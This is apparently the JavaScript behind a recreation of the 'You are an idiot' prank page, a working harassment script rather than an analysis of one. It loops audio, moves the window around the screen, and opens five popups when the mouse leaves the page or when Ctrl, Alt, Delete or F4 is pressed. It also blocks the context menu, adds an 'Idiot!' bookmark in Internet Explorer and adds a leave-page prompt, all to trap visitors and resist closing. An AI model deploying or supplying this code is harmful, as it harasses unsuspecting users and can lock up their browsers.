/* [Oct 2021] Added to comply with strict browser policies. */
document.addEventListener("click", musicPlay);

function musicPlay() {
    const audio = document.getElementById("youare-audio");
    const micon = document.getElementById("youare-micon");

    micon.addEventListener("click", musicPlay);

    if (audio.duration > 0 && audio.paused) {
        audio.play();
        micon.src = "/public/images/speaker.png";
    } else {
        audio.pause();
        audio.currentTime = 0;

        micon.src = "/public/images/speakerm.png";
    }

    document.removeEventListener("click", musicPlay);
}

const faudio = new Audio("/public/media/youare.mp3");

faudio.addEventListener("timeupdate", function () {
    console.log("TimeUpdate invoked.");

    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});
/* [Oct 2021] End part. */

function bookmark() {
    if (
        navigator.appName === "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        const url = "lol.html";
        const title = "Idiot!";

        window.external.AddFavorite(url, title);
    }
}

let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = -100;
let flagRun = 1;

function changeTitle(title) {
    document.title = title;
}

function openWindow(url) {
    console.log("open window");
    window.open(
        url,
        "_blank",
        "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes"
    );
}

function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow("/lol");
    }
}

function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}

function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}

function fOff() {
    flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();

    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun === 1) {
        window.moveTo(xPos, yPos);
        setTimeout("playBall()", 1);
    }
}

/* [Oct 2021] Better code. */
window.onload = function () {
    flagRun = 1;

    playBall();
    bookmark(); // Internet Explorer only (what a piece of shit)

    return true;
};

window.onmouseout = function () {
    proCreate();

    return null;
};

window.oncontextmenu = function () {
    return false;
};

window.onkeydown = function () {
    const keyCode = event.keyCode;

    if (keyCode === 17 || keyCode === 18 || keyCode === 46 || keyCode === 115) {
        alert("Bienvenido a Gand4alf!");
        proCreate();
    }

    return null;
};

window.onbeforeunload = function () {
    return " ¿ eres tonto o que ?";
};
/* [Oct 2021] End of amendments. */
